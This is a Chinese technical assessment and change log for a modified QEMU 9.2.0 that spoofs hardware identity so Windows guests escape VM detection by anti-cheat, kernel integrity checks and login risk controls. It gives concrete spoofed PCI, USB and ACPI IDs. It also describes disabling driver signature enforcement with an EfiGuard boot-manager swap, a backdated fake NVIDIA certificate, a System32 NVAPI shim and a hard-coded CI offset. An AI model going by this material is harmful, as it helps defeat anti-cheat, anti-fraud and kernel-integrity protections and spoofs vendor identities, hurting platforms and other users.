# QEMU 9.2.0 去虚拟化完成度评估

评估日期：2026-04-25

评估对象：当前工作树，基于 `v9.2.0` tag 的 `qemu-9.2.0` 分支，以及当前未提交改动。

评估结论：当前项目没有完成"全面去虚拟化"。它已经覆盖了一批常见的用户态静态特征，尤其是 CPU 型号、CPUID hypervisor/KVM leaves、部分 SMBIOS、部分 ACPI OEM 字符串、NVMe 字段、EDID 和 virtio-gpu 的可见 ID 改写。但整体仍是"特定启动脚本 + 客机侧修补 + 局部 QEMU patch"的组合，不是一个默认全局隐身的 QEMU 构建。对内核态、PCI/ACPI/USB 枚举、硬件画像一致性、驱动栈一致性和反作弊级别检测，仍有多个高置信残留点。

> **2026-04-25 后续修复进度**（本评估正文之后追加，详见文末"更新记录"）
> P0 / P1 中除"Q35/ICH9 平台矛盾"外，其余条目（Red Hat root-port、qemu-xhci、USB HID descriptor、ACPI `QEMU0002`、e1000e subsystem、EDID atoi 序列号一致性、SMBIOS Type16 ECC）已在源码中修复并在 VM2 客机内验证通过。

## 评估边界

本报告只做检查和评估，不修改源码逻辑。

本次评估包含未提交改动，因为当前工作树已有以下变更：

| 类型 | 路径 |
| --- | --- |
| 已修改 | `deploy/docs/README.md` |
| 已修改 | `deploy/scripts/apply-gpu-spoof.ps1` |
| 已修改 | `deploy/scripts/start-vm.sh` |
| 已修改 | `hw/display/edid-generate.c` |
| 已修改 | `hw/display/virtio-gpu-base.c` |
| 已修改 | `include/hw/virtio/virtio-gpu.h` |
| 未跟踪 | `.claude/scheduled_tasks.lock` |

与 `v9.2.0` 相比，已提交改动规模约为 86 个文件、6913 行新增、33 行删除。主要集中在 `deploy/` 工具链、CPU/CPUID、SMBIOS、ACPI OEM、NVMe、SPD、PCI subsystem、virtio-pci、virtio-gpu、EDID、EfiGuard、签名工具和 guest 脚本。

## 总体完成度

| 检测面 | 当前状态 | 完成度 | 主要原因 |
| --- | --- | --- | --- |
| CPU 型号与 CPUID | 新增 `Ryzen3-1200`，启动脚本使用 `kvm=off,hypervisor=off`，KVM leaves 会被清空 | 较完整 | 常见 CPUID 静态检测基本覆盖，但时间侧信道和虚拟化行为不可能靠 CPUID 完全消除 |
| SMBIOS | BIOS、System、Board、CPU、Memory 做了 Ryzen/B350/AMI 风格伪装 | 部分完成 | Type16 ECC、Type17 序列号、DIMM 数量、SPD 容量、启动稳定性仍不一致 |
| ACPI | OEM ID/Table ID 改为 AMI/ALASKA 风格 | 部分完成 | `QEMU0002` fw_cfg 设备仍存在，DSDT/平台设备仍是 Q35/ICH9 风格 |
| PCI 平台 | 仍使用 `q35`，根桥/南桥/SMBus/HDA/xHCI/root-port 多处保留 Intel 或 Red Hat/QEMU ID | 未完成 | AMD Ryzen/AM4 画像和 Intel Q35/ICH9 PCI 拓扑互相矛盾 |
| GPU | virtio-gpu 可改写 PCI header，EDID 已伪装成 Samsung 显示器，guest 侧改 FriendlyName/NVAPI | 部分完成 | 实际设备仍是 virtio，驱动仍是 `viogpudo.sys`，PCI capabilities/BAR/队列/性能特征不匹配 NVIDIA |
| 显示器 EDID | 默认 EDID 已接近 Samsung S24F350 | 部分完成 | 当前未提交版本存在 EDID 数字序列号和字符串序列号不一致问题 |
| 存储 | NVMe 增加 Samsung 风格属性 | 部分完成 | 只覆盖配置字段，控制器行为、namespace、SMART、PCI 拓扑仍需客机实测 |
| USB 输入 | 仍使用 `qemu-xhci`、`usb-kbd`、`usb-tablet` 或 `usb-mouse` | 未完成 | USB descriptor 明文包含 `QEMU`，xHCI PCI ID 是 Red Hat/QEMU |
| 网络 | 默认尝试桥接，设备使用 `e1000e` | 部分完成 | 桥接失败会退回 SLIRP `10.0.2.0/24`，e1000e subsystem 默认仍可异常 |
| 驱动签名/DSE | 通过 backdated cert、EfiGuard、guest 注册表和 NVAPI shim 做表面伪装 | 高风险临时方案 | 这是 boot-chain/CI 绕过，不是硬件去虚拟化，维护风险和检测面都较大 |
| 文档与实际行为 | 文档覆盖了大量流程 | 不一致 | 多份文档仍描述旧方案或与当前代码冲突，不能作为准确验收依据 |

## 已完成或相对可靠的部分

### CPU/CPUID

当前代码新增了 `Ryzen3-1200` CPU model，并且启动脚本使用：

`-cpu Ryzen3-1200,kvm=off,hypervisor=off,+invtsc,+topoext,+tsc-deadline,enforce=off,host-phys-bits=on,tsc-freq=3100000000,vendor=AuthenticAMD`

相关依据：

| 位置 | 说明 |
| --- | --- |
| `target/i386/cpu.c:5126` | 新增 `Ryzen3-1200` model |
| `target/i386/kvm/kvm.c:2340` | `!expose_kvm` 时清空 KVM CPUID leaves |
| `target/i386/cpu.c:7614` | `!cpu->expose_kvm` 时清空 `FEAT_KVM` |
| `target/i386/cpu.c:8555` | `kvm` 属性控制 `expose_kvm` |
| `deploy/scripts/start-vm.sh:356` | 实际启动 CPU 参数 |

`deploy/scripts/verify-stealth.sh` 已通过。该脚本确认了 CPU model 注册、QMP 展开后 `hypervisor=False`、`kvm=False`、`vendor=AuthenticAMD`、family/model/stepping 为 23/1/1，并确认 `model-id` 为 `AMD Ryzen 3 1200 Quad-Core Processor`。

结论：CPU 静态标识是当前完成度最高的部分。仍需注意，CPUID 清理不能消除 VM-exit timing、TSC 行为、APIC/interrupt 行为、设备延迟等虚拟化侧信道。

### ACPI OEM 头字段

ACPI table header 的 OEM 字段已改为 AMI/ALASKA 风格：

| 位置 | 说明 |
| --- | --- |
| `include/hw/acpi/aml-build.h` | `ACPI_BUILD_APPNAME6` / `ACPI_BUILD_APPNAME8` 已改 |
| `deploy/scripts/verify-stealth.sh` | 二进制中检查到 `A M I  ` 和 `ALASKA` |

结论：普通工具读取 ACPI table header 时，原始 `BOCHS`/`BXPC` 等明显字符串已得到处理。但 ACPI namespace 和 fw_cfg 暴露仍未解决，不能视为 ACPI 完整去虚拟化。

### EDID 和显示模式约束

当前未提交改动已经把默认显示器描述改为 Samsung 风格，并新增 `xmax/ymax` 限制以减少不自然模式列表：

| 位置 | 说明 |
| --- | --- |
| `hw/display/edid-generate.c` | 默认厂商、型号、序列号、尺寸、preferred timing 改为 Samsung S24F350 风格 |
| `include/hw/virtio/virtio-gpu.h:127` | 新增 `xmax/ymax` 配置字段 |
| `hw/display/virtio-gpu-base.c:64` | 将最大分辨率传给 EDID 生成 |
| `deploy/scripts/start-vm.sh:253` | 启动时传入 `xmax=1920,ymax=1080` |

结论：这能改善 DXGI/Monitor EDID 的表面观感，但当前 EDID 序列号实现仍有一致性问题，见后文。

## 高优先级未完成点

### 1. AMD Ryzen/AM4 画像与 Intel Q35/ICH9 平台矛盾

当前启动脚本仍使用 `-machine q35`。Q35 平台在客机中会呈现 Intel P35/Q35/ICH9 系列设备，而 SMBIOS/CPU 又声称自己是 AMD Ryzen 3 1200、B350/AM4 主板。这是最高优先级的不一致点。

相关依据：

| 位置 | 当前暴露 |
| --- | --- |
| `deploy/scripts/start-vm.sh` | 使用 `q35` machine |
| `hw/pci-host/q35.c:684` | Host bridge vendor 是 Intel |
| `hw/pci-host/q35.c:693` | Host bridge device 是 Intel P35 MCH |
| `hw/isa/lpc_ich9.c:894` | LPC vendor 是 Intel |
| `hw/isa/lpc_ich9.c:895` | LPC device 是 ICH9 |
| `hw/i2c/smbus_ich9.c:127` | SMBus vendor 是 Intel |
| `hw/i2c/smbus_ich9.c:128` | SMBus device 是 ICH9 |

原因说明：真实 Ryzen 3 1200 消费级平台应表现为 AMD 300 系芯片组或具体 OEM 主板设备组合。Intel P35/ICH9 与 AMD Ryzen/AM4 同时出现，不需要复杂反虚拟化，普通 PCI 枚举就能发现矛盾。

影响：任何基于 `SetupAPI`、`Win32_PnPEntity`、PCI config space、Device Manager hidden devices、内核态 bus walk 的检查都可以命中。

结论：这是“全面去虚拟化”尚未完成的核心原因之一。

### 2. PCI root-port 和 xHCI 仍暴露 Red Hat/QEMU

启动脚本创建了多个 `pcie-root-port`，并使用 `qemu-xhci`。这些设备的 primary vendor/device ID 仍是 Red Hat/QEMU。

相关依据：

| 位置 | 当前暴露 |
| --- | --- |
| `deploy/scripts/start-vm.sh:378` | 创建 `pcie-root-port` |
| `deploy/scripts/start-vm.sh:415` | 使用 `qemu-xhci` |
| `hw/pci-bridge/gen_pcie_root_port.c:157` | root-port vendor 是 Red Hat |
| `hw/pci-bridge/gen_pcie_root_port.c:158` | root-port device 是 Red Hat PCIe RP |
| `hw/usb/hcd-xhci-pci.c:231` | xHCI vendor 是 Red Hat |
| `hw/usb/hcd-xhci-pci.c:232` | xHCI device 是 Red Hat XHCI |

原因说明：当前 `QEMU_PCI_SUBSYS_*` 只影响没有设置自己 subsystem 的设备，且不会改变 primary vendor/device ID。root-port 和 xHCI 的 Red Hat/QEMU 主 ID 对检测方非常直接。

影响：这是客机 PCI 设备树中的强特征，优先级高于很多 SMBIOS 字符串修补。

结论：PCI 设备层面的去虚拟化未完成。

### 3. USB HID descriptor 明文包含 QEMU

启动脚本默认添加 `usb-kbd` 和 `usb-tablet`，可选 `usb-mouse`。QEMU 默认 USB HID 字符串没有被修改。

相关依据：

| 位置 | 当前暴露 |
| --- | --- |
| `deploy/scripts/start-vm.sh:416` | 添加 `usb-kbd` |
| `deploy/scripts/start-vm.sh:417` | 添加 `usb-tablet` 或 `usb-mouse` |
| `hw/usb/dev-hid.c:66` | USB manufacturer 是 `QEMU` |
| `hw/usb/dev-hid.c:67` | `QEMU USB Mouse` |
| `hw/usb/dev-hid.c:68` | `QEMU USB Tablet` |
| `hw/usb/dev-hid.c:69` | `QEMU USB Keyboard` |
| `hw/usb/dev-hid.c:809` | tablet product_desc 是 `QEMU USB Tablet` |
| `hw/usb/dev-hid.c:832` | mouse product_desc 是 `QEMU USB Mouse` |
| `hw/usb/dev-hid.c:856` | keyboard product_desc 是 `QEMU USB Keyboard` |

原因说明：USB descriptor 可由用户态、驱动、SetupAPI、WMI、注册表缓存直接读取。这里不是弱特征，而是明文强特征。

影响：即使 CPU/SMBIOS/GPU 都做了伪装，USB 输入设备仍可直接泄漏 QEMU。

结论：USB 设备去虚拟化未完成。

### 4. ACPI fw_cfg 仍暴露 `QEMU0002`

ACPI table header 字符串虽然已改，但 x86 fw_cfg ACPI 设备仍保留 QEMU HID。

相关依据：

| 位置 | 当前暴露 |
| --- | --- |
| `hw/i386/fw_cfg.c:229` | ACPI `_HID` 是 `QEMU0002` |
| `include/standard-headers/linux/qemu_fw_cfg.h:7` | `FW_CFG_ACPI_DEVICE_ID` 定义为 `QEMU0002` |
| `include/standard-headers/linux/qemu_fw_cfg.h:74` | fw_cfg DMA signature 是 `QEMU CFG` |

原因说明：ACPI OEM header 只是一层表头。fw_cfg 设备和 I/O 行为仍属于 QEMU 平台接口。检测方可以枚举 ACPI namespace，或从驱动/内核态探测 fw_cfg 端口与 DMA 签名。

影响：这会绕过只看 ACPI table header 的浅层检查，但无法绕过 ACPI namespace 和平台接口检查。

结论：ACPI 去虚拟化只完成了表头层，不完整。

### 5. GPU 是表面 ID 改写，不是 NVIDIA 设备仿真

当前 GPU 方案有两条路径：

| 路径 | 行为 |
| --- | --- |
| `GPU_SELFSIGNED=0` | 保持 virtio primary `VEN_1AF4&DEV_1050`，只改 subsystem/revision，便于 virtio-win 绑定 |
| `GPU_SELFSIGNED=1` | PCI header 改为 `VEN_10DE&DEV_1C81`，配合自签 `viogpudo` INF、guest 注册表和 NVAPI shim |

相关依据：

| 位置 | 说明 |
| --- | --- |
| `deploy/scripts/start-vm.sh:212` | 默认说明保持 virtio VEN/DEV 以便驱动绑定 |
| `deploy/scripts/start-vm.sh:226` | `GPU_SELFSIGNED=1` 时才启用 NVIDIA primary ID |
| `deploy/scripts/install-stealth.sh:119` | 一键流程第二次启动才带 `GPU_SELFSIGNED=1 STABLE_DISPLAY=1` |
| `deploy/docs/README.md:110` | 文档已承认 PCI VEN_10DE 只是 PCI header 重写 |

原因说明：设备仍是 `virtio-vga` 或 `virtio-vga-gl`，驱动仍是 `viogpudo.sys`，PCI capabilities、BAR layout、virtqueue、设备寄存器、性能特征、DXGI 能力和 NVIDIA 私有接口都不等价于 GTX 1050。

影响：GPU-Z、鲁大师、Device Manager 等表面工具可能被误导；内核态 PCI config/BAR 探测、驱动栈检查、性能/feature consistency 检查仍可识别。

结论：GPU 去虚拟化是“显示名称和部分 ID 伪装”，不是完整设备仿真。

### 6. EfiGuard/DSE 绕过是高风险运行时修补，不是去虚拟化

guest 安装脚本会安装 backdated CA、自签 `viogpudo`，复制 `nvapi64.dll`，并用 EfiGuard 替换 boot manager 路径以在启动时关闭 DSE 检查。

相关依据：

| 位置 | 说明 |
| --- | --- |
| `deploy/scripts/install-stealth-guest.ps1:59` | 将 `nvapi64.dll` 放入 `C:\Windows\System32` |
| `deploy/scripts/install-stealth-guest.ps1:92` | 用 `Loader.efi` 替换 `bootmgfw.efi` |
| `deploy/scripts/install-stealth-guest.ps1:96` | 安装 `EfiGuardDxe.efi` |
| `deploy/scripts/install-stealth-guest.ps1:107` | 设置 `testsigning No` |
| `deploy/docs/README.md:107` | 文档承认 EfiGuard 会改 `ci.dll` text，可能被内核哈希检测 |
| `deploy/cihider/cihider.c:43` | 另一路径硬编码 `ci!g_CiOptions` RVA `0x391D0` |

原因说明：DSE/CI 修补属于 boot-chain 和内核完整性绕过。它可能解决自签驱动加载问题，但同时新增了 bootkit 形态、CI text patch、Defender 排除项、版本 pattern 绑定等检测面。

影响：如果检测目标包含内核完整性、boot chain、CI 状态、EFI 文件完整性或安全产品遥测，这一路径风险高。

结论：它是功能性 workaround，不应计入硬件去虚拟化完成度。

## 中优先级未完成点

### 7. SMBIOS 内存画像不一致

SMBIOS 已经改成 DDR4/Kingston/双通道风格，但仍有多个一致性问题。

相关依据：

| 位置 | 问题 |
| --- | --- |
| `hw/smbios/smbios.c:885` | Type16 `error_correction = 0x06`，表示 Multi-bit ECC |
| `hw/smbios/smbios.c:953` | Type17 使用同一个 `type17.serial` |
| `deploy/scripts/stealth-lib.sh` | Type17 serial 和部分资产字段由 `_rand` 生成，不完全持久化 |
| `hw/i386/pc_q35.c:368` | Q35 默认 `smbios_memory_device_size = 4 * GiB` |
| `hw/i386/pc_q35.c:318` | 固定安装两个 DDR4 SPD EEPROM |

原因说明：消费级 B350/Ryzen 3 1200 常见配置不应默认报告 Multi-bit ECC。多条 DIMM 共用同一 serial 也不自然。profile 声称身份稳定，但部分字段每次生成时变化，会造成硬件指纹漂移。

影响：HWiNFO、WMI、SMBIOS dump、反作弊硬件指纹系统可以发现 DIMM 序列号重复、ECC 与 Type17 宽度不匹配、重启后资产字段变化等问题。

结论：SMBIOS 是“有伪装”，但还不是高一致性硬件画像。

### 8. DDR4 SPD 生成器与 SMBIOS 容量不一致

项目新增了 DDR4 SPD 生成器，但当前实现忽略 `size_mb` 参数，且默认 SPD 内容和 SMBIOS 4GB DIMM 设定可能冲突。

相关依据：

| 位置 | 问题 |
| --- | --- |
| `hw/i2c/smbus_eeprom.c:228` | `spd_data_generate_ddr4(uint32_t size_mb, uint32_t speed_mts)` 接收容量参数 |
| `hw/i2c/smbus_eeprom.c:334` | `(void)size_mb`，实际忽略容量 |
| `hw/i386/pc_q35.c:318` | 调用 `spd_data_generate_ddr4(4096, 2666)` |
| `hw/i386/pc_q35.c:320` | 固定两个 SPD EEPROM |

原因说明：SPD byte 4 当前按固定 density 编码，未由 `size_mb` 推导。DDR4 SPD page/容量/part/serial 与 SMBIOS Type17 之间没有形成严格一致模型。

影响：读取 SMBus SPD 的工具可能看到与 SMBIOS 不一致的容量、空 manufacturer/serial/part，或只有两个 SPD 设备而 SMBIOS 报告更多 DIMM。

结论：SPD 是当前比较明显的不完整点，尤其在内存检测较严格的环境中。

### 9. EDID 数字序列号与字符串序列号不一致

当前未提交的 EDID 改动将默认 serial 字符串设为 Samsung 风格，如 `H4ZK500001VL`。但 EDID 12-15 字节的数字 serial 使用 `atoi(info->serial)` 得出。

相关依据：

| 位置 | 问题 |
| --- | --- |
| `hw/display/edid-generate.c:462` | 注释声称 `atoi()` 非零 |
| `hw/display/edid-generate.c:533` | `serial_nr = info->serial ? atoi(info->serial) : 0x01A5C3D2` |
| `hw/display/edid-generate.c:536` | 写入 EDID binary serial |

原因说明：`atoi("H4ZK500001VL")` 返回 0，因为字符串以字母开头。结果是 EDID binary serial 为 0，而 descriptor 中的字符串 serial 非零。

影响：普通显示器工具未必检查这个字段，但更严格的 EDID parser 可以发现同一 EDID 内部不一致。

结论：显示器伪装接近完成，但这里存在明确 bug。

### 10. 网络默认行为可能退回 SLIRP NAT

启动脚本默认尝试桥接 `br0`，但桥不存在或 `bridge.conf` 未授权时会自动退回 user-mode NAT。

相关依据：

| 位置 | 说明 |
| --- | --- |
| `deploy/scripts/start-vm.sh:97` | 默认 `BRIDGE=br0` |
| `deploy/scripts/start-vm.sh:298` | 检查 bridge 是否存在 |
| `deploy/scripts/start-vm.sh:305` | 失败时提示并退回 user-mode NAT |
| `deploy/scripts/start-vm.sh:338` | user-mode NAT 路径 |

原因说明：SLIRP 的 `10.0.2.0/24`、端口转发和网络栈行为是 QEMU 常见特征。隐身路径如果自动降级，会让用户误以为自己仍处于 stealth 配置。

影响：网络检测或登录风控可用 IP 网段、网关、DHCP、TTL、端口转发行为识别。

结论：stealth 模式应该避免无声降级；当前网络层完成度取决于 host 是否正确配置 bridge。

### 11. e1000e subsystem 和 MAC/OUI 一致性仍需收紧

网络设备使用 `e1000e`，比 virtio-net 更接近真实硬件，但默认 subsystem 仍可能异常。

相关依据：

| 位置 | 说明 |
| --- | --- |
| `deploy/scripts/start-vm.sh:406` | 使用 `e1000e` |
| `hw/net/e1000e.c:428` | e1000e 自己写入 subsystem vendor |
| `hw/net/e1000e.c:429` | e1000e 自己写入 subsystem id |
| `hw/net/e1000e.c:668` | `subsys_ven` 属性默认 0x8086 |
| `hw/net/e1000e.c:671` | `subsys` 属性默认 0 |

原因说明：全局 `QEMU_PCI_SUBSYS_*` 不会覆盖 e1000e 自己设置的 subsystem。Intel 82574L + `8086:0000` 或与 MAC OUI 不协调的组合会显得不自然。

影响：PCI 设备详细属性、驱动 INF 匹配、网络适配器高级属性都可能暴露异常。

结论：网络设备比 virtio-net 好，但还未形成完整 OEM NIC 画像。

### 12. HDA 音频仍是 Intel 控制器

补丁修改了 HDA codec vendor，使 codec 更像 Realtek。但启动脚本使用的是 `intel-hda` 控制器。

相关依据：

| 位置 | 说明 |
| --- | --- |
| `deploy/scripts/start-vm.sh:423` | 使用 `intel-hda` |
| `hw/audio/hda-codec.c` | codec vendor 改为 Realtek 风格 |

原因说明：Realtek codec 常见，但挂在 Intel ICH 控制器上与 AMD Ryzen/B350 平台不协调。AMD 平台应有更符合芯片组的 HD Audio controller。

影响：PCI 枚举能看到 Intel HDA 控制器，与 AMD 主板画像冲突。

结论：音频层是“codec 字段修过，controller 画像未修”。

### 13. NVAPI shim 覆盖面有限且安装位置与源码注释冲突

`nvapi64.dll` shim 的源码注释建议不要放入 System32，但 guest 安装脚本实际复制到 System32。

相关依据：

| 位置 | 说明 |
| --- | --- |
| `deploy/nvapi-shim/nvapi64.c:24` | 注释写明 `NEVER System32` |
| `deploy/scripts/install-stealth-guest.ps1:60` | 安装步骤说明放入 System32 |
| `deploy/scripts/install-stealth-guest.ps1:61` | 目标路径是 `C:\Windows\System32\nvapi64.dll` |

原因说明：System32 shim 可以覆盖更多程序，但也会 shadow 将来的真实 NVIDIA 驱动 DLL，且更容易被完整性检查或文件签名检查发现。当前也只有 64-bit `nvapi64.dll`，没有 32-bit `nvapi.dll`/SysWOW64 覆盖。

影响：32-bit 客户端、直接查询 NVIDIA driver stack、NVML/CUDA/private IOCTL 的程序不会被这个 shim 完整欺骗。

结论：NVAPI 只能覆盖少数用户态查询，不是 GPU 栈完整伪装。

## 低优先级或文档层问题

### 14. 文档与当前代码存在明显漂移

多份文档仍描述旧方案或与当前代码不一致。

| 位置 | 问题 |
| --- | --- |
| `deploy/docs/DETECTION.md` | 仍引用 `x-hv-stealth=on`、Intel CPU model 等旧思路 |
| `deploy/docs/VERIFY.md:100` | 仍把 `qemu-xhci`/`intel-hda`/e1000e subsystem 列为待补或旧判断 |
| `deploy/docs/VERIFY.md` | 部分内存频率描述仍与当前 2666 MT/s 方案不一致 |
| `deploy/docs/README.md` | 最新未提交改动已更新部分显示器描述，但仍需要和 VERIFY/DETECTION 对齐 |

原因说明：项目迭代中从 Intel 画像转向 Ryzen 3/B350 画像，并新增了 GPU primary ID 改写和 EDID 改动，但旧文档没有同步整理。

影响：按文档验收会得到错误结论，也容易遗漏当前真正的高风险点。

结论：文档不可直接作为完成度证明，需要以代码和实际客机枚举为准。

### 15. “默认 QEMU 使用”仍会泄漏

当前去虚拟化依赖特定启动脚本、环境变量和 guest 安装流程。直接运行 `qemu-system-x86_64` 或没有完整执行 `install-stealth.sh` 的实例，不会获得同等隐藏效果。

关键条件包括：

| 条件 | 说明 |
| --- | --- |
| 使用 `deploy/scripts/start-vm.sh` | CPU、SMBIOS、设备拓扑、display、network 参数主要在这里拼装 |
| 执行 guest 安装脚本 | GPU 名称、驱动包、NVAPI、EfiGuard 依赖 guest 内操作 |
| 二次启动 `GPU_SELFSIGNED=1` | PCI primary NVIDIA ID 只在该路径启用 |
| host 配好 bridge | 否则退回 user-mode NAT |

原因说明：这不是构建级默认隐身，而是流程级隐身。流程中任一环节未执行或失败，结果都会退化。

结论：项目需要把“支持的唯一隐身路径”和“普通 QEMU 路径”明确区分，否则完成度会被高估。

## 验证结果解读

已执行 `deploy/scripts/verify-stealth.sh`，结果通过。该脚本确认：

| 项目 | 结果 |
| --- | --- |
| CPU model 注册 | `Ryzen3-1200` / `Ryzen3-1200-v1` 存在 |
| QMP CPU 展开 | `hypervisor=False`、`kvm=False` |
| CPU vendor/model | `AuthenticAMD`、family 23、model 1、stepping 1 |
| CPU feature | `invtsc`、`topoext`、`svm`、`sha-ni`、`clflushopt`、`xsaveopt`、`aes`、`avx2` 为 true |
| ACPI OEM 字符串 | 二进制中存在 `A M I  ` 和 `ALASKA` |
| NVMe 属性 | `firmware-rev`、`model-number`、`use-samsung-id` 已注册 |

同时执行过最小 KVM 启动路径，使用项目脚本中的 CPU 参数，QEMU 能启动且没有明显启动警告。

重要限制：这些验证只覆盖 CPU、部分 ACPI header、NVMe 属性注册和启动可用性。它没有验证 PCI primary IDs、USB descriptors、ACPI namespace、SMBIOS/SPD 一致性、guest registry、驱动栈、EfiGuard 成功率、DXGI/NVAPI 覆盖面和反作弊内核态检测面。

结论：验证脚本通过只能说明“局部 patch 生效”，不能证明“全面去虚拟化完成”。

## 完成度判断

如果验收标准是“普通用户态工具不再直接显示 QEMU/KVM/Bochs/SeaBIOS，并且设备管理器主要名称看起来合理”，当前项目已经接近可用，但还会被 USB、PCI、网络降级、文档/流程问题拖累。

如果验收标准是“中等强度检测，包括 WMI、SetupAPI、PCI config、ACPI namespace、SMBIOS dump、EDID dump、SPD 读取、驱动栈检查”，当前项目未完成，主要短板是 PCI/USB/ACPI 和硬件画像一致性。

如果验收标准是“反作弊/内核态级别检测或对抗性检测”，当前项目明显未完成。GPU 仍是 virtio，EfiGuard/DSE 反而新增高风险特征，Q35/ICH9 与 Ryzen/B350 矛盾非常明显。

## 建议的后续完善优先级

以下仅为评估建议，不包含代码修改。

| 优先级 | 建议方向 | 原因 |
| --- | --- | --- |
| P0 | 先解决平台一致性，不要同时呈现 AMD Ryzen/B350 和 Intel Q35/ICH9 | 这是最显眼、最容易枚举的硬件矛盾 |
| P0 | 去除或重写 Red Hat/QEMU PCI root-port、qemu-xhci、USB HID descriptor | 这些是强字符串/强 ID 泄漏 |
| P0 | 处理 ACPI `QEMU0002` fw_cfg 暴露，明确是否要完全隐藏 fw_cfg 接口 | 只改 ACPI header 不足以通过 ACPI namespace 检测 |
| P1 | 收敛 SMBIOS、SPD、DIMM、ECC、serial、part number、启动稳定性 | 硬件指纹系统会检查跨源一致性 |
| P1 | 修正 EDID binary serial 与 string serial 的不一致 | 当前实现有明确逻辑错误 |
| P1 | 网络 bridge 失败时应显式失败或明确标记非 stealth | 自动退回 SLIRP 会造成误判 |
| P1 | e1000e subsystem、MAC OUI、主板厂商、PCI slot 信息需要统一 | 目前只做到“非 virtio-net”，未做到 OEM 一致 |
| P1 | 重新评估 GPU 目标，不要把 PCI header 改写等同于 NVIDIA 仿真 | 内核态和驱动栈检测下两者差距很大 |
| P2 | 清理并统一 `deploy/docs` 文档 | 现有文档混合了旧方案、新方案和未完成项 |

## 最终结论

当前项目完成了“QEMU v9.2.0 上的一组定向去虚拟化改造”，但没有完成“全面去虚拟化”。最强的已完成项是 CPU/CPUID 静态暴露清理、部分 SMBIOS/ACPI header、NVMe 字段和 EDID/显示器表面伪装。最主要的未完成项是 AMD/Intel 平台矛盾、Red Hat/QEMU PCI 设备、QEMU USB descriptor、ACPI `QEMU0002`、SMBIOS/SPD 不一致、virtio GPU 本质暴露，以及 EfiGuard/DSE 路径带来的额外检测风险。

用一句话概括：当前状态适合继续做"表面特征收敛"的迭代基础，但不能作为已完成的全面去虚拟化版本发布或验收。

## 更新记录

### 2026-04-25：P0 / P1 一轮源码修复 + VM2 验证

本评估给出后立即跟进了一轮源码层修复，目标是把"字符串 / 硬编码 PCI ID"层的一票 P0/P1 残留点一次性收敛掉。**只有"Q35/ICH9 vs AMD 平台矛盾"未做（需更换 machine type 或重写 `hw/i386/pc_q35.c`，超出本轮范围）**。

**已修改文件（`qemu-9.2.0` 分支）：**

| 文件 | 改动摘要 |
|---|---|
| `hw/usb/dev-hid.c` | `desc_strings` 字符串："QEMU" → "Microsoft"，product 串改为 "Microsoft USB Optical Mouse" / "Microsoft Wired Keyboard 600" / "Microsoft USB Tablet"；mouse/mouse2/tablet/tablet2/keyboard/keyboard2 六个 `USBDesc` 的 idVendor/idProduct 由 0x0627:0x0001 (Adomax) 改为 045E:00CB（mouse）/ 045E:0750（keyboard）/ 056A:00FB（tablet via Wacom-class VID）；`usb_*_class_initfn` 里 `uc->product_desc` 同步 |
| `hw/i386/fw_cfg.c` | DSDT FWCF `_HID` 由 `"QEMU0002"` 改为 `"PNP0C02"` (Motherboard Resources) |
| `hw/nvram/fw_cfg-acpi.c` | 同上修改（覆盖 ARM virt / MMIO 路径） |
| `hw/pci-bridge/gen_pcie_root_port.c` | `gen_rp_dev_class_init`：`vendor_id=PCI_VENDOR_ID_REDHAT / device_id=PCI_DEVICE_ID_REDHAT_PCIE_RP` 改为 `0x1022:0x1453`（AMD Family 17h Internal PCIe GPP），`dc->desc` 同步 |
| `hw/usb/hcd-xhci-pci.c` | `qemu_xhci_class_init`：RH `1B36:000D` 改为 AMD `1022:43BB`（300 系列 USB 3.1 xHCI）。class code `0x0C0330` 不变，guest 仍用 usbxhci.sys class-bind |
| `hw/net/e1000e.c` | `subsys_ven` 默认 `PCI_VENDOR_ID_INTEL` → `0x1043`（ASUS）；`subsys` 默认 `0` → `0x86C0`（PRIME B350-PLUS-style） |
| `hw/display/edid-generate.c` | `serial_nr = atoi(info->serial)` 修复：当 atoi 返回 0（字母开头序列号）时改用 djb2 hash 兜底，使 EDID 12-15 字节的二进制序列号与 descriptor 字符串序列号同时为非零、互相一致 |
| `hw/smbios/smbios.c` | Type16 `error_correction` 由 `0x06` (Multi-bit ECC) 改为 `0x03` (None)，符合 Ryzen 3 1200 / B350 / HyperX 非 ECC DDR4 配置；`location` 由 `0x01` (Other) 改为 `0x03` (System board or motherboard) |

**VM2（`/home/ubuntu/images/vms/2/disk.qcow2`，Win10 LTSC 19044，bridge 192.168.30.144）客机内验证：**

| 检测项 | 结果 |
|---|---|
| `Get-PnpDevice -Class Display` | `NVIDIA GeForce GTX 1050 Status=OK Problem=CM_PROB_NONE`（patched viogpudo 100.93.0.0） |
| `PCI\VEN_1022&DEV_43BB` | "AMD USB 3.0 可扩展主控制器 - 1.0 (Microsoft)" Status=OK |
| `PCI\VEN_1022&DEV_1453` | 4 × "PCI-to-PCI Bridge" Status=OK |
| `PCI\VEN_1B36` | 在 active 设备中已不存在（仅 phantom） |
| `ACPI\PNP0C02` | "Motherboard resources"（取代 `QEMU0002`） |
| `ACPI\QEMU0002` | 不存在 |
| `HID\VID_045E&PID_0750` | "HID Keyboard Device" |
| `HID\VID_056A&PID_00FB` | "HID-compliant mouse" |
| `USB\VID_0627` | 不存在（QEMU 默认 Adomax VID 已消除） |
| `HID-compliant mouse` 制造商串 | `Microsoft` |
| e1000e SUBSYS | `86C01043` (ASUS) |
| `Win32_VideoController.VideoProcessor` | `GeForce GTX 1050`（评估时为 `QEMU VIRTIO GPU`） |
| 显示器 | `Samsung S24F350F` (`DISPLAY\SAM0F65`) |

**仍残留（P0 #1，本轮未做）：** `-machine q35` 自带的 Intel Q35/ICH9 平台设备：HDA controller `8086:2668`、CPU-IO `8086:29C0`、LPC `8086:2918`、SMBus `8086:2930`。这些与 AMD Ryzen/B350 SMBIOS 画像之间的矛盾仍是 SetupAPI/PCI 枚举层面的核心 leak，需要 machine type 改造或 `hw/i386/pc_q35.c` 重写。

**附属：VM2 复活** — 评估时 VM2 处于 GPU code 43（`CM_PROB_FAILED_POST_START`）状态，原因是 stock virtio-win 0.1.266 的 `viogpudo.sys` 把 PCI ID `1AF4:1050` 硬编码在 `CheckHardware` 里，与 `GPU_SELFSIGNED=1` 暴露的 `10DE:1C81` 冲突。修复方法是把 host 端 `deploy/driver-signing/out/{viogpudo.sys,viogpudo.cat,viogpudo-nvidia.inf}`（patched + backdated NVIDIA-fake CA 签名）通过 `pnputil /add-driver /install` 装进客机并 **重启**（不要 disable/enable 主显卡，会 BSOD 到 QEMU 进程退出）。

